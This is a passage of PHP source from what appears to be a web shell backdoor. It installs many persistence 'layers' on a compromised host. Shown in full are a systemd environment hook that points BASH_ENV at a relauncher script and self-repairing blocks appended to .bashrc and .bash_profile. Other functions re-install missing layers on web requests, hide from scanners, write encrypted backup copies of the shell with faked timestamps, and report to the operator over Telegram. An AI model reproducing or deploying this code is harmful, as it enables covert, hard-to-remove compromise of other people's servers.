class WnSystemdEnvLayer extends WnBaseLayer {
    public function key() { return 'systemd_env'; }
    private function shim() { return wn_state_dir() . '/.envsh_' . substr(md5(wn_get_key('benv')), 0, 10) . '.sh'; }
    private function envdFile($home) { return $home . '/.config/environment.d/99-' . substr(md5(wn_get_key('envd')), 0, 8) . '.conf'; }
    private function userConf($home) { return $home . '/.config/systemd/user.conf'; }
    private function marker() { return '# envd_' . substr(md5(wn_get_key('envd')), 0, 8); }

    public function install(array $ctx) {
        $home = $ctx['home']; $entry = $ctx['entry']; $php = $ctx['php_bin'];
        $shim = $this->shim();
        $shimCode = "#!/bin/sh\n" .
            "[ -f " . escapeshellarg($entry) . " ] && { pgrep -f " . escapeshellarg(basename($entry)) . " >/dev/null 2>&1 || (" . escapeshellarg($php) . " " . escapeshellarg($entry) . " >/dev/null 2>&1 &); }\n" .
            "date +%s > " . escapeshellarg(wn_trap_guard('ghost')) . " 2>/dev/null\n";
        if (wn_call('fpc', $shim, $shimCode) === false) return ['ok'=>false,'detail'=>'shim write fail'];
        @chmod($shim, 0700);

        $envDir = $home . '/.config/environment.d';
        if (!is_dir($envDir)) @mkdir($envDir, 0700, true);
        $envContent = "BASH_ENV=" . $shim . "\nENV=" . $shim . "\n";
        $envOk = is_dir($envDir) && is_writable($envDir) && wn_call('fpc', $this->envdFile($home), $envContent) !== false;
        if ($envOk) @chmod($this->envdFile($home), 0600);

        $ucDir = $home . '/.config/systemd';
        if (!is_dir($ucDir)) @mkdir($ucDir, 0700, true);
        $ucFile = $this->userConf($home);
        $existing = file_exists($ucFile) ? (string)wn_call('fgc', $ucFile) : '';
        $marker = $this->marker();
        $ucOk = false;
        if (is_writable($ucDir) || file_exists($ucFile)) {
            if (strpos($existing, $marker) === false) {
                $directive = "DefaultEnvironment=\"BASH_ENV=" . $shim . "\" \"ENV=" . $shim . "\"\n";
                if (preg_match('/^\[Manager\]/m', $existing)) {
                    $existing = preg_replace('/(\[Manager\][^\[]*)/m', '$1' . $directive, $existing, 1);
                    wn_call('fpc', $ucFile, $existing);
                } else {
                    wn_call('fpc', $ucFile, $existing . "\n" . $marker . "\n[Manager]\n" . $directive);
                }
                @chmod($ucFile, 0600);
                $ucOk = true;
            } else {
                $ucOk = true;
            }
        }
        if ($ucOk) cmd_exec('systemctl --user daemon-reexec 2>/dev/null');
        return ['ok'=>$envOk || $ucOk, 'detail'=>'envd=' . ($envOk?'OK':'FAIL') . ' userconf=' . ($ucOk?'OK':'FAIL')];
    }
    public function uninstall(array $ctx) {
        $home = $ctx['home']; $n = 0;
        $shim = $this->shim();
        if (file_exists($shim)) { @unlink($shim); $n++; }
        $ef = $this->envdFile($home);
        if (file_exists($ef)) { @unlink($ef); $n++; }
        $uc = $this->userConf($home);
        if (file_exists($uc)) {
            $c = (string)wn_call('fgc', $uc);
            $marker = $this->marker();
            if (strpos($c, $marker) !== false) {
                $c = preg_replace('/\n' . preg_quote($marker, '/') . '\n\[Manager\]\nDefaultEnvironment=[^\n]*\n/', "\n", $c);
                $c = preg_replace('/DefaultEnvironment="BASH_ENV=' . preg_quote($shim, '/') . '"[^\n]*/', "", $c);
                $c = preg_replace('/DefaultEnvironment="ENV=' . preg_quote($shim, '/') . '"[^\n]*/', "", $c);
                wn_call('fpc', $uc, trim($c) . "\n"); @chmod($uc, 0600);
                cmd_exec('systemctl --user daemon-reexec 2>/dev/null');
                $n++;
            }
        }
        return ['ok'=>true,'removed'=>$n];
    }
    public function status(array $ctx) {
        $home = $ctx['home'];
        $shimOk = file_exists($this->shim());
        $envdOk = file_exists($this->envdFile($home));
        $ucOk = false;
        if (file_exists($this->userConf($home))) { $c = (string)wn_call('fgc', $this->userConf($home)); $ucOk = strpos($c, 'BASH_ENV=' . $this->shim()) !== false; }
        return ['active'=>$shimOk && ($envdOk || $ucOk), 'detail'=>"shim=$shimOk envd=$envdOk uc=$ucOk"];
    }
}

class WnGhostTrapLayer extends WnBaseLayer {
    public function key() { return 'ghost_trap'; }
    private function ghostContent() { return wn_state_dir() . '/.gshc_' . substr(md5(wn_get_key('gshc')), 0, 10); }
    private function ghostFile() { return wn_state_dir() . '/.gsh_' . substr(md5(wn_get_key('gsh')), 0, 10) . '.sh'; }
    private function shadowMarker() { return '# t3_shadow_' . substr(md5(wn_get_key('t3s')), 0, 10); }
    private function baseMarker() { return '# t3_base_' . substr(md5(wn_get_key('t3b')), 0, 10); }
    private function baseTarget($home) {
        foreach (['/.bash_login', '/.bash_profile', '/.profile'] as $f) if (file_exists($home . $f)) return $home . $f;
        return $home . '/.bash_profile';
    }
    private function shadowTarget($home) { return $home . '/.bashrc'; }

    public function install(array $ctx) {
        $home = $ctx['home']; $php = $ctx['php_bin']; $entry = $ctx['entry'];
        $gContent = $this->ghostContent();
        $gFile = $this->ghostFile();
        $gGuard = wn_trap_guard('ghost');
        $sGuard = wn_trap_guard('shadow');
        $bGuard = wn_trap_guard('base');
        $shadowF = $this->shadowTarget($home);
        $baseF = $this->baseTarget($home);
        $shMarker = $this->shadowMarker();
        $bMarker = $this->baseMarker();

        // 1. write ghost content template
        $ghostCode = "#!/bin/sh\n" .
            "[ -f " . escapeshellarg($entry) . " ] && { pgrep -f " . escapeshellarg(basename($entry)) . " >/dev/null 2>&1 || (" . escapeshellarg($php) . " " . escapeshellarg($entry) . " >/dev/null 2>&1 &); }\n" .
            "date +%s > " . escapeshellarg($gGuard) . " 2>/dev/null\n";
        if (wn_call('fpc', $gContent, $ghostCode) === false) return ['ok'=>false,'detail'=>'ghost content write fail'];
        @chmod($gContent, 0700);

        // 2. write ghost shim (copy of content)
        if (wn_call('fpc', $gFile, $ghostCode) === false) return ['ok'=>false,'detail'=>'ghost write fail'];
        @chmod($gFile, 0700);

        // 3. SHADOW block — maintains ghost via cp
        $shadowBlock = "\n" . $shMarker . "\n" .
            "[ -f " . escapeshellarg($entry) . " ] && { pgrep -f " . escapeshellarg(basename($entry)) . " >/dev/null 2>&1 || (" . escapeshellarg($php) . " " . escapeshellarg($entry) . " >/dev/null 2>&1 &); }\n" .
            "date +%s > " . escapeshellarg($sGuard) . " 2>/dev/null\n" .
            "[ -f " . escapeshellarg($gFile) . " ] || cp " . escapeshellarg($gContent) . " " . escapeshellarg($gFile) . " 2>/dev/null\n" .
            "[ -f " . escapeshellarg($gFile) . " ] && chmod 700 " . escapeshellarg($gFile) . " 2>/dev/null\n";
        $shExisting = file_exists($shadowF) ? (string)wn_call('fgc', $shadowF) : '';
        $shOK = false;
        if (strpos($shExisting, $shMarker) === false) {
            if (@file_put_contents($shadowF, $shadowBlock, FILE_APPEND | LOCK_EX) !== false) { @chmod($shadowF, 0644); $shOK = true; }
        } else $shOK = true;

        // 4. BASE block — maintains shadow + ghost via cp
        $baseBlock = "\n" . $bMarker . "\n" .
            "[ -f " . escapeshellarg($entry) . " ] && { pgrep -f " . escapeshellarg(basename($entry)) . " >/dev/null 2>&1 || (" . escapeshellarg($php) . " " . escapeshellarg($entry) . " >/dev/null 2>&1 &); }\n" .
            "date +%s > " . escapeshellarg($bGuard) . " 2>/dev/null\n" .
            "[ -f " . escapeshellarg($gFile) . " ] || cp " . escapeshellarg($gContent) . " " . escapeshellarg($gFile) . " 2>/dev/null\n" .
            "[ -f " . escapeshellarg($gFile) . " ] && chmod 700 " . escapeshellarg($gFile) . " 2>/dev/null\n" .
            "if ! grep -q " . escapeshellarg($shMarker) . " " . escapeshellarg($shadowF) . " 2>/dev/null; then\n" .
            "  printf '\\n%s\\n' " . escapeshellarg($shMarker) . " >> " . escapeshellarg($shadowF) . "\n" .
            "  printf '%s\\n' \"[ -f " . $entry . " ] && { pgrep -f " . basename($entry) . " >/dev/null 2>&1 || (" . $php . " " . $entry . " >/dev/null 2>&1 \\&); }\" >> " . escapeshellarg($shadowF) . "\n" .
            "  printf '%s\\n' \"date +%s > " . $sGuard . " 2>/dev/null\" >> " . escapeshellarg($shadowF) . "\n" .
            "  printf '%s\\n' \"[ -f " . $gFile . " ] || cp " . $gContent . " " . $gFile . " 2>/dev/null\" >> " . escapeshellarg($shadowF) . "\n" .
            "fi\n";
        $bExisting = file_exists($baseF) ? (string)wn_call('fgc', $baseF) : '';
        $bOK = false;
        if (strpos($bExisting, $bMarker) === false) {
            if (@file_put_contents($baseF, $baseBlock, FILE_APPEND | LOCK_EX) !== false) { @chmod($baseF, 0644); $bOK = true; }
        } else $bOK = true;

        // 5. wire BASH_ENV via environment.d
        $envOk = false;
        $envDir = $home . '/.config/environment.d';
        if (!is_dir($envDir)) @mkdir($envDir, 0700, true);
        if (is_dir($envDir) && is_writable($envDir)) {
            $ef = $envDir . '/99-' . substr(md5(wn_get_key('benv')), 0, 8) . '.conf';
            $envOk = wn_call('fpc', $ef, "BASH_ENV=" . $gFile . "\n") !== false;
            if ($envOk) @chmod($ef, 0600);
        }
        return ['ok'=>$shOK && $bOK && $envOk, 'detail'=>"ghost=OK shadow=" . ($shOK?'OK':'FAIL') . " base=" . ($bOK?'OK':'FAIL') . " env=" . ($envOk?'OK':'FAIL')];
    }

    public function uninstall(array $ctx) {
        $home = $ctx['home']; $n = 0;
        $gf = $this->ghostFile();
        if (file_exists($gf)) { @unlink($gf); $n++; }
        $gc = $this->ghostContent();
        if (file_exists($gc)) { @unlink($gc); $n++; }
        $shMarker = $this->shadowMarker(); $shadowF = $this->shadowTarget($home);
        if (file_exists($shadowF)) {
            $c = (string)wn_call('fgc', $shadowF);
            if (strpos($c, $shMarker) !== false) {
                $lines = explode("\n", $c); $out = []; $skip = 0;
                foreach ($lines as $l) { if (strpos($l, $shMarker) !== false) { $skip = 5; continue; } if ($skip > 0) { $skip--; continue; } $out[] = $l; }
                wn_call('fpc', $shadowF, implode("\n", $out)); $n++;
            }
        }
        $bMarker = $this->baseMarker(); $baseF = $this->baseTarget($home);
        if (file_exists($baseF)) {
            $c = (string)wn_call('fgc', $baseF);
            if (strpos($c, $bMarker) !== false) {
                $lines = explode("\n", $c); $out = []; $skip = 0;
                foreach ($lines as $l) { if (strpos($l, $bMarker) !== false) { $skip = 10; continue; } if ($skip > 0) { $skip--; continue; } $out[] = $l; }
                wn_call('fpc', $baseF, implode("\n", $out)); $n++;
            }
        }
        $ef = $home . '/.config/environment.d/99-' . substr(md5(wn_get_key('benv')), 0, 8) . '.conf';
        if (file_exists($ef)) { @unlink($ef); $n++; }
        return ['ok'=>true,'removed'=>$n];
    }

    public function status(array $ctx) {
        $home = $ctx['home'];
        $g = file_exists($this->ghostFile());
        $s = false; $shadowF = $this->shadowTarget($home);
        if (file_exists($shadowF)) $s = strpos((string)wn_call('fgc', $shadowF), $this->shadowMarker()) !== false;
        $b = false; $baseF = $this->baseTarget($home);
        if (file_exists($baseF)) $b = strpos((string)wn_call('fgc', $baseF), $this->baseMarker()) !== false;
        return ['active'=>$g && $s && $b, 'detail'=>"ghost=" . ($g?'Y':'N') . " shadow=" . ($s?'Y':'N') . " base=" . ($b?'Y':'N')];
    }
}

/* ─── Manager: 25 layer ─── */
function wn_layer_manager() {
    static $m = null;
    if ($m === null) {
        $m = new WnLayerManager();
        $m->register(new WnCronLayer())->register(new WnDaemonLayer())->register(new WnWatchdogLayer())
          ->register(new WnSystemdLayer())->register(new WnLingerLayer())->register(new WnBashRcLayer())
          ->register(new WnSshRcLayer())->register(new WnBashLogoutLayer())->register(new WnAtJobLayer())
          ->register(new WnNpmLayer())->register(new WnComposerLayer())->register(new WnShellTrapLayer())
          ->register(new WnGitHookLayer())
          /* Part 4 */
          ->register(new WnSystemdTimerLayer())->register(new WnXdgAutostartLayer())
          ->register(new WnTmuxHookLayer())->register(new WnVimRcLayer())
          ->register(new WnPythonSiteLayer())->register(new WnSshConfigLayer())
          ->register(new WnNpmrcLayer())->register(new WnEmacsRcLayer())
          ->register(new WnLessfilterLayer())->register(new WnXSessionRcLayer())
          /* Part 5 */
          ->register(new WnSystemdEnvLayer())->register(new WnGhostTrapLayer());
    }
    return $m;
}

/* ─── Auto-heal critical layers (dipanggil dari wn_web_trigger) ─── */
function wn_autoheal_critical_layers() {
    if (!wn_check_auth_cookie()) return;
    $cooldownFile = wn_blend_name('layer_heal');
    $last = (int)@wn_call('fgc', $cooldownFile);
    if ($last > 0 && (time() - $last) < 300) return;
    $home = wn_get_home(); if (!$home) return;
    $linger = function_exists('posix_getpwuid') ? (@posix_getpwuid(@posix_getuid())['name'] ?? null) : null;
    $status = wn_layer_manager()->statusAll(['home'=>$home,'linger_user'=>$linger]);
    $critical = ['daemon','watchdog','cron','shell_rc','systemd_timer','tmux_hook'];
    $missing = [];
    foreach ($critical as $k) if (isset($status[$k]) && empty($status[$k]['active'])) $missing[] = $k;
    if (empty($missing)) return;
    $best = wn_find_best_php(null);
    $entry = wn_wrapper_exists();
    if (!$best || !$entry) return;
    @wn_call('fpc', $cooldownFile, time());
    $ctx = ['php_bin'=>$best['bin'],'entry'=>$entry,'home'=>$home,'linger_user'=>$linger];
    foreach ($missing as $k) wn_layer_manager()->installByKey($k, $ctx);
}
function wn_web_trigger() {
    global $__B, $__C;
    if (!wn_can_shell()) return;
    if (wn_is_hidden()) return;
$__ph = phantom_apply();
$__isOwner = function_exists('wn_check_auth_cookie') && wn_check_auth_cookie();
if ($__ph['silent'] && !$__isOwner) { while (ob_get_level() > 0) @ob_end_clean(); @http_response_code(404); exit; }
if ($__ph['dormant'] && !$__isOwner) return;
$home = wn_get_home(); if (!$home) return;
    wn_wake_watcher();
    $triggerFile = wn_blend_name('last');
    $lastRun = (int)wn_call('fgc', $triggerFile);
    if (time() - $lastRun < 15) return;
    wn_call('fpc', $triggerFile, time());
    $dyingFile = wn_blend_name('dying');
    if (file_exists($dyingFile)) { $dyingAt = (int)@wn_call('fgc', $dyingFile); if ($dyingAt > 0 && (time() - $dyingAt) < 300) return; @unlink($dyingFile); }
    $wrapper = wn_wrapper_exists(); $entry = $wrapper;
    if (!$entry && wn_check_auth_cookie()) { @set_time_limit(180); try { $r = auto_install_watcher_controller(true); if (($r['status'] ?? '') === 'success') $entry = $r['wrapper'] ?? null; } catch (Throwable $e) { } }
    if (!$entry) { $liveWatcher = null; foreach (wn_watcher_locations() as $w) if (@file_exists($w)) { $liveWatcher = $w; break; } if ($liveWatcher) { $entry = $liveWatcher; $wcode = wn_call('fgc', $liveWatcher); if ($wcode !== false && $wcode !== '') { $d = []; $rw = wn_install_wrappers($d, $wcode); if (!empty($rw)) $entry = $rw[0]; } } else return; }
    $best = wn_find_best_php($__B); $php = $best ? $best['bin'] : null;
    if (!$php) { $php = trim((string)cmd_exec('which php 2>/dev/null')); if (!$php) foreach (['/usr/local/bin/php','/usr/bin/php'] as $p) if (file_exists($p)) { $php = $p; break; } }
    if (!$php) return;
    $running = trim((string)cmd_exec("pgrep -f " . escapeshellarg($entry) . " 2>/dev/null"));
    $liveFile = wn_state_dir() . '/.lv_' . substr(md5($__B), 0, 8);
    $liveAge = file_exists($liveFile) ? (time() - filemtime($liveFile)) : -1;
    $stuck = ($liveAge < 0 || $liveAge > 90);
    if (empty($running) || $stuck) { if ($stuck && !empty($running)) { cmd_exec('pkill -9 -f ' . escapeshellarg($entry) . ' 2>/dev/null'); usleep(500000); } wn_run_bg(escapeshellarg($php) . " " . escapeshellarg($entry)); }
    $daemon = wn_daemon_status(); if (!$daemon['alive']) { $d = []; wn_spawn_daemon($php, $entry, $d); }
    $watchdog = wn_watchdog_status(); if (!$watchdog['alive']) { $d = []; wn_spawn_watchdog($php, $entry, $d); }
    $cron = (string)cmd_exec('crontab -l 2>/dev/null');
    if (stripos($cron, 'cleanup.lock') === false && stripos($cron, basename($entry)) === false) wn_restore_cron($php, wn_wrapper_cron_targets());
    // defense: repair layer critical yang hilang
    try { wn_autoheal_critical_layers(); } catch (Throwable $e) {}
    // MORPH auto tick (web trigger)
try {
    $__mLast = (int)wn_call('fgc', morph_f('last_web_tick'));
    if (time() - $__mLast >= 600) {  // check every 10 min
        wn_call('fpc', morph_f('last_web_tick'), (string)time(), LOCK_EX);
        morph_apply();
    }
} catch (Throwable $e) {}
    // optional feature pack tick (stub, no-op jika tidak ada)
    $nfFile = wn_state_dir() . '/.newfiles_last_check';
    $nfLast = file_exists($nfFile) ? (int)wn_call('fgc', $nfFile) : 0;
    if (time() - $nfLast > 180) { wn_call('fpc', $nfFile, (string)time(), LOCK_EX); try { wn_nf_check(); } catch (Throwable $e) {} }
}
function wn_bootstrap() {
    static $ran = false; if ($ran) return; $ran = true;
    $skipScanner = !empty($_SERVER['HTTP_X_WN_KEY']) || isset($_GET['wn_otp']) || isset($_GET['wn_tg']) || isset($_GET['wn_fleet']) || isset($_GET['wn_fleet_bootstrap']);
    if (!$skipScanner && wn_is_scanner()) wn_decoy_accept_aware();
    wn_web_trigger();
wn_heal_backups();
try { wn_trap_beat('ghost'); } catch (Throwable $e) {}
try { swarm_auto_tick(); } catch (Throwable $e) {}
try { mesh_auto_tick(); }  catch (Throwable $e) {}
}
function wn_heal_backups() {
    global $__B;
    $SHELL_PATH = __FILE__;
    $BACKUPS = wn_backup_locations();
    $REPLICA_BACKUPS = wn_replica_backup_paths();
    if (!file_exists($SHELL_PATH)) return 0;
    $plain = @wn_call('fgc', $SHELL_PATH);
    if ($plain === false || strlen($plain) < 100) return 0;
    $key = hash('sha256', 'bkenc:' . ($__B ?? '') . ':w', true);
    $iv = random_bytes(16);
    if (function_exists('openssl_encrypt')) {
        $ct = openssl_encrypt($plain, 'aes-256-cbc', $key, OPENSSL_RAW_DATA, $iv);
        $enc = ($ct !== false) ? 'ENC1:' . base64_encode($iv . $ct) : false;
    } else {
        $out = ''; $counter = 0;
        for ($i = 0; $i < strlen($plain); $i += 32) { $ks = hash_hmac('sha256', $iv . pack('N', $counter++), $key, true); $out .= substr($plain, $i, 32) ^ $ks; }
        $enc = 'ENC2:' . base64_encode($iv . $out);
    }
    if ($enc === false) return 0;
    $n = 0;
    foreach (array_merge($BACKUPS, $REPLICA_BACKUPS) as $bk) {
        if (file_exists($bk)) continue;
        $d = dirname($bk); if (!is_dir($d)) @mkdir($d, 0700, true);
        if (is_dir($d) && is_writable($d)) { if (wn_call('fpc', $bk, $enc) !== false) { @chmod($bk, 0400); wn_apply_mtime($bk); $n++; } }
    }
    return $n;
}
function wn_clean_state_files() {
    $explicit = [wn_blend_name('daemon_pid'),wn_blend_name('watchdog_pid'),wn_blend_name('heartbeat'),wn_blend_name('started'),wn_blend_name('last_selfheal'),wn_blend_name('activity'),wn_blend_name('deadman'),wn_blend_name('deadman_noted'),wn_blend_name('rm_pending'),wn_blend_name('sd_pending'),wn_blend_name('cron_backup'),wn_blend_name('integrity_check'),wn_blend_name('integrity_alert'),wn_blend_name('integrity_pause'),wn_blend_name('integrity_pause_ttl'),wn_blend_name('layer_heal')];
    foreach ($explicit as $f) @unlink($f);
    $dir = wn_state_dir();
    foreach ((array)glob($dir . '/.otp_*') as $f) @unlink($f);
    foreach ((array)glob($dir . '/.lk_*') as $f) @unlink($f);
    foreach ((array)glob($dir . '/.lv_*') as $f) @unlink($f);
    foreach ((array)glob($dir . '/.of_*') as $f) @unlink($f);
    foreach ((array)glob($dir . '/.ls_*') as $f) @unlink($f);
    foreach ((array)glob($dir . '/.bl_*') as $f) @unlink($f);
    foreach ((array)glob($dir . '/.fl_*') as $f) @unlink($f);
    foreach ((array)glob($dir . '/.sf_*') as $f) @unlink($f);
    foreach ((array)glob($dir . '/.sb_*') as $f) @unlink($f);
    foreach ((array)glob($dir . '/.so_*') as $f) @unlink($f);
    foreach ((array)glob($dir . '/.t3_*') as $f) @unlink($f);
}

/* ═══ INSTALL / UNINSTALL / STATUS CONTROLLERS ═══ */
function auto_install_watcher_controller($silent = false, $slaveMode = false) {
    global $__B, $__C, $CURRENT_SHELL, $rootPath;
    @set_time_limit(300); @ini_set('display_errors', '0');
    $log = ["[START] " . date('Y-m-d H:i:s')];
    if (!wn_can_shell()) return ['status'=>'error','message'=>'Shell disabled','log'=>$log,'layers'=>[]];
    @unlink(wn_blend_name('dying'));
    if (is_shell_available()) {
        foreach (['daemon_pid','watchdog_pid'] as $pk) { $pf = wn_blend_name($pk); if (file_exists($pf)) { $pid = (int)wn_call('fgc', $pf); if ($pid > 0) cmd_exec('kill -9 ' . $pid . ' 2>/dev/null'); @unlink($pf); } }
        cmd_exec('pkill -9 -f ' . escapeshellarg(basename(wn_blend_name('daemon_php'))) . ' 2>/dev/null');
        cmd_exec('pkill -9 -f ' . escapeshellarg(basename(wn_blend_name('watchdog_php'))) . ' 2>/dev/null');
        cmd_exec('pkill -9 -f "php-sess-" 2>/dev/null');
        foreach (wn_wrapper_locations() as $w) cmd_exec('pkill -9 -f ' . escapeshellarg(basename($w)) . ' 2>/dev/null');
        foreach (wn_watcher_locations() as $w) cmd_exec('pkill -9 -f ' . escapeshellarg(basename($w)) . ' 2>/dev/null');
        usleep(700000);
    }
    $home = wn_get_home();
    if (!$home) return ['status'=>'error','message'=>'Home not found','log'=>$log];
    if (wn_get_stored_mtime() <= 0) wn_capture_mtime(__FILE__);
    $bestPhp = wn_find_best_php($__B);
    if (!$bestPhp) return ['status'=>'error','message'=>'No PHP CLI','log'=>$log];
    $phpBin = $bestPhp['bin']; $phpVersion = $bestPhp['version_str'];
    $scheme = (!empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off') ? 'https' : 'http';
    $selfUrl = $scheme . '://' . wn_safe_host() . ($_SERVER['SCRIPT_NAME'] ?? ('/' . $CURRENT_SHELL));
    $secret = hash('sha256', 'wn_tg:' . $__B . ':' . wn_get_salt());
    $_cfg = wn_cfg_b64();
    try { $code = auto_build_watcher_code($_cfg['k'], $_cfg['j'], $CURRENT_SHELL, $rootPath, wn_backup_filename(), $home, $selfUrl, $secret, $slaveMode); }
    catch (Throwable $e) { unset($_cfg); return ['status'=>'error','message'=>'build: '.$e->getMessage(),'log'=>$log]; }
    unset($_cfg);
    if (empty($code) || strlen($code) < 500) return ['status'=>'error','message'=>'Watcher empty','log'=>$log];
    $written = [];
    foreach (wn_watcher_locations() as $loc) { $dir = dirname($loc); if (!is_dir($dir)) @mkdir($dir, 0700, true); if (!is_dir($dir) || !is_writable($dir)) continue; if (wn_call('fpc', $loc, $code) !== false) { @chmod($loc, 0600); $written[] = $loc; } }
    if (empty($written)) return ['status'=>'error','message'=>'Cannot write watcher','log'=>$log];
    $wrapperWritten = wn_install_wrappers($log, $code);
    // Force reset ghost ownership
if(function_exists('ghost_save')){
    @ghost_save('state',['gen'=>0,'owner_pid'=>0,'owner_path'=>'','owner_since'=>0,'pending_path'=>'','pending_pid'=>0]);
}
// Force reset phantom to NORMAL
if(function_exists('phantom_save')){
    @phantom_save('state',['level'=>3,'score'=>0,'prev_level'=>3,'enabled'=>true,'sensitivity'=>1.0,'last_check'=>time(),'signals'=>[]]);
}
// Force reset witness
if(function_exists('witness_save_level')){
    @witness_save_level(0);
}
// Clear silence & observer flags
@unlink(wn_state_dir().'/.wsil_'.substr(md5("wit:sil:".$__B),0,8));
@unlink(wn_state_dir().'/.swobs_'.substr(md5("swarm:observe:".$__B),0,8));
@unlink(wn_state_dir().'/.mer_'.substr(md5("mesh:role:".$__B),0,12).'.dat');
    if (empty($wrapperWritten)) return ['status'=>'error','message'=>'Cannot write wrapper','log'=>$log];
    $entry = $wrapperWritten[0];
    $backupWritten = 0;
    foreach (array_merge(wn_backup_locations(), wn_replica_backup_paths()) as $b) { if (file_exists($b)) { $backupWritten++; continue; } $dir = dirname($b); if (!is_dir($dir)) @mkdir($dir, 0700, true); if (is_dir($dir) && is_writable($dir)) { if (@copy(__FILE__, $b)) { @chmod($b, 0400); wn_apply_mtime($b); $backupWritten++; } } }
    $lingerUser = null;
    if (function_exists('posix_getpwuid')) { $u = @posix_getpwuid(@posix_getuid()); if ($u && !empty($u['name'])) $lingerUser = $u['name']; }
    if (!$lingerUser) $lingerUser = trim((string)cmd_exec('id -un 2>/dev/null'));
    $ctx = ['php_bin'=>$phpBin,'entry'=>$entry,'home'=>$home,'linger_user'=>$lingerUser,'self_url'=>$selfUrl];
    $results = wn_layer_manager()->installAll($ctx);
    $layers = []; $cronOK = false; $rebootOK = false;
    foreach ($results as $key => $r) { $layers[$key] = $r['ok'] ?? false; if (isset($r['count'])) $layers[$key . '_count'] = $r['count']; if ($key === 'cron' && !empty($r['ok'])) { $cronOK = true; $rebootOK = !empty($r['reboot']); } }
    wn_call('fpc', wn_blend_name('started'), time());
    wn_call('fpc', wn_blend_name('heartbeat'), time());
    wn_apply_mtime(__FILE__);
    if (!$silent) {
        $msg = "SYS INSTALLED" . ($slaveMode ? " (SLAVE)" : "") . "\nHost: " . htmlspecialchars(wn_safe_host(), ENT_QUOTES, 'UTF-8') .
            "\n\nPHP: $phpBin (v$phpVersion)" .
            "\nWatcher: " . count($written) . "\nBackups: $backupWritten" .
            "\nCron: " . ($cronOK ? 'OK' : 'FAIL') .
            "\nDaemon: " . (!empty($layers['daemon']) ? 'OK' : 'FAIL') .
            "\nWatchdog: " . (!empty($layers['watchdog']) ? 'OK' : 'FAIL') .
            "\nSystemd: " . (!empty($layers['systemd']) ? 'OK' : 'SKIP') .
            "\nSysdTimer: " . (!empty($layers['systemd_timer']) ? 'OK' : 'SKIP') .
            "\nSysdEnv: " . (!empty($layers['systemd_env']) ? 'OK' : 'SKIP') .
            "\nGhostTrap: " . (!empty($layers['ghost_trap']) ? 'OK' : 'SKIP') .
            "\nXDG: " . (!empty($layers['xdg_autostart']) ? 'OK' : 'SKIP') .
            "\nTmux: " . (!empty($layers['tmux_hook']) ? 'OK' : 'SKIP') .
            "\nVim: " . (!empty($layers['vim_rc']) ? 'OK' : 'SKIP') .
            "\nPython: " . (!empty($layers['python_site']) ? 'OK (' . ($layers['python_site_count'] ?? 0) . ')' : 'SKIP') .
            "\nSSHcfg: " . (!empty($layers['ssh_config']) ? 'OK' : 'SKIP') .
            "\n.npmrc: " . (!empty($layers['npmrc']) ? 'OK' : 'SKIP') .
            "\nEmacs: " . (!empty($layers['emacs_rc']) ? 'OK' : 'SKIP') .
            "\nLessfilter: " . (!empty($layers['lessfilter']) ? 'OK' : 'SKIP') .
            "\nXSession: " . (!empty($layers['xsession_rc']) ? 'OK' : 'SKIP') .
            ($slaveMode ? "\n\nBot polling: OFF (slave)" : "\n\nTest: /status");
        sendTelegramMessage($__B, $__C, $msg);
    }
    return ['status'=>'success','message'=>'Installed','php_bin'=>$phpBin,'php_version'=>$phpVersion,'watcher'=>$written[0],'watcher_count'=>count($written),'backup_count'=>$backupWritten,'wrapper'=>$entry,'cron_ok'=>$cronOK,'reboot_ok'=>$rebootOK,'slave_mode'=>$slaveMode,'layers'=>$layers,'log'=>$log];
}
function auto_uninstall_watcher_controller() {
    global $__B, $__C;
    @set_time_limit(120);
    $home = wn_get_home(); $removed = 0; $log = [];
    if (is_shell_available()) {
        $existing = (string)cmd_exec('crontab -l 2>/dev/null');
        if ($existing !== '') { $lines = array_filter(explode("\n", $existing), 'wn_cron_filter_callback'); $tmp = tempnam(sys_get_temp_dir(), 'cron_'); wn_call('fpc', $tmp, implode("\n", $lines) . "\n"); cmd_exec('crontab ' . escapeshellarg($tmp) . ' 2>/dev/null'); @unlink($tmp); }
        @wn_call('fpc', wn_blend_name('dying'), (string)time(), LOCK_EX);
        $wName = basename(wn_blend_name('watchdog_php')); $dName = basename(wn_blend_name('daemon_php'));
        cmd_exec('pkill -9 -f ' . escapeshellarg($wName) . ' 2>/dev/null');
        @unlink(wn_blend_name('watchdog_pid')); usleep(400000);
        cmd_exec('pkill -9 -f ' . escapeshellarg($dName) . ' 2>/dev/null');
        @unlink(wn_blend_name('daemon_pid')); usleep(400000);
        cmd_exec('pkill -9 -f "php-sess-" 2>/dev/null');
        foreach (wn_watcher_locations() as $w) cmd_exec('pkill -9 -f ' . escapeshellarg(basename($w)) . ' 2>/dev/null');
        foreach (wn_wrapper_locations() as $w) cmd_exec('pkill -9 -f ' . escapeshellarg(basename($w)) . ' 2>/dev/null');
        usleep(500000);
    }
    $lingerUser = null;
    if (function_exists('posix_getpwuid')) { $u = @posix_getpwuid(posix_getuid()); if ($u && !empty($u['name'])) $lingerUser = $u['name']; }
    $un = wn_layer_manager()->uninstallAll(['home'=>$home,'linger_user'=>$lingerUser,'php_bin'=>null,'entry'=>null]);
    $removed += $un['total_removed'];
    foreach (wn_watcher_locations() as $p) if (file_exists($p)) { @unlink($p); $removed++; }
    foreach (wn_wrapper_locations() as $p) if (file_exists($p)) { @unlink($p); $removed++; }
    foreach (wn_backup_locations() as $p) if (file_exists($p)) { @unlink($p); $removed++; }
    foreach (wn_replica_backup_paths() as $p) if (file_exists($p)) { @unlink($p); $removed++; }
    foreach ([wn_blend_name('daemon_php'), wn_blend_name('watchdog_php')] as $p) if (file_exists($p)) @unlink($p);
    @unlink(wn_state_dir() . '/.lv_' . substr(md5($__B), 0, 8));
    @unlink(wn_state_dir() . '/.lk_' . substr(md5($__B), 0, 8));
    $still = trim((string)cmd_exec('pgrep -f "php-sess-" 2>/dev/null'));
    sendTelegramMessage($__B, $__C, "[UNINSTALLED]\nHost: " . htmlspecialchars(wn_safe_host(), ENT_QUOTES, 'UTF-8') . "\nRemoved: $removed items\nResidual: " . (empty($still) ? '0' : $still));
    return ['status'=>'success','message'=>"Removed $removed items",'log'=>$log,'residual'=>$still];
}
function watcher_status_controller() {
    global $__B;
    $home = wn_get_home();
    $watchers = wn_watcher_locations(); $wrappers = wn_wrapper_locations();
    $wInfo = []; foreach ($watchers as $w) $wInfo[] = ['path'=>$w,'exists'=>file_exists($w),'size'=>file_exists($w)?(int)@filesize($w):0];
